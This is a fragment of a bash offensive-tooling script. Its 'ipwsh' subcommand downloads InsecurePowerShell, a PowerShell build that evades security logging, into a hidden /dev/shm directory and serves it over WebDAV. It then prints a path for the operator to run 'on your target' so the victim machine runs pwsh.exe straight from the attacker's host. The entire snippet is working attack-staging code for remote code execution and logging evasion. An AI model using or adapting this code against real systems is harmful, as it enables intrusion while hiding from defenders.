## ipwsh [port]^: Download InsecurePowerShell and serve via davserver
if [ "$1" == "ipwsh" ]; then
  echo "[?] Download InsecurePowerShell and serve via davserver?"; prompt
  if [ ! "$(which davserver)" ]; then
    echo "[!] 'davserver' required but missing."
    CMD="sudo pip3 install PyWebDAV3"
    echo "> $CMD";
    prompt
    bash -c "$CMD"
  fi

  FPATH="/dev/shm/.fxy/ipwsh"
  if [ -d "$FPATH/pwsh" ]; then
    cd "$FPATH/pwsh"
  else
    mkdir -p "$FPATH"
    cd "$FPATH"
    wget https://github.com/cobbr/InsecurePowerShell/releases/download/InsecurePowerShell-v6.0.0-rc.2/InsecurePowerShell-v6.0.0-rc.2-win-x64.zip -O pwsh.zip
    unzip pwsh.zip
    mv InsecurePowerShell-v6.0.0-rc.2-win-x64 pwsh
    cd pwsh
  fi

  PORT="80"
  if [ "$#" -ge 2 ]; then
    PORT="$2"
  fi

  echo -e "\n$(tput bold)[*] Run this on your target:"

  if [ "$PORT" -eq 80 ]; then
    echo "  \\\\$(getIP)\DavWWWRoot\pwsh\pwsh.exe"
  else
    echo "  \\\\$(getIP)@$PORT\DavWWWRoot\pwsh\pwsh.exe"
  fi
  echo "$(tput sgr0) "

  CMD="davserver -H 0.0.0.0 -P $PORT -D $FPATH -n"
  echo "> $CMD";
  bash -c "$CMD"
  exit
fi
# 2DO:
# - Somehow ipwsh can't access c:\
